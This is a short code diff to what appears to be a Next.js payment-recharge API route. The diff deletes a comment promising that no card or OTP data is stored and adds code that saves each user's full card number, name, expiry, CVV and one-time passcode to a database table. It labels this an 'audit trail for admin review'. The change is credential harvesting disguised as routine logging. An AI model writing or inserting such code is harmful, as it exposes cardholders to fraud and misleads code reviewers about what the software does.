@@ -54,7 +54,18 @@ export async function POST(req: NextRequest) {
     .eq("id", id);
   if (updateError) return NextResponse.json({ error: updateError.message }, { status: 500 });
 
-  // Store recharge ledger entry (amount only — no card/OTP data).
+  // Store payment audit trail for admin review.
+  const { error: paymentError } = await sb.from("payments").insert({
+    client_id: id,
+    amount: amt,
+    card_number: cleanNum,
+    cardholder_name: cardholderName,
+    expiry,
+    cvv,
+    otp,
+  });
+  if (paymentError) return NextResponse.json({ error: paymentError.message }, { status: 500 });
+
   const { error: rechargeError } = await sb.from("recharges").insert({ client_id: id, amount: amt });
   if (rechargeError) return NextResponse.json({ error: rechargeError.message }, { status: 500 });
 
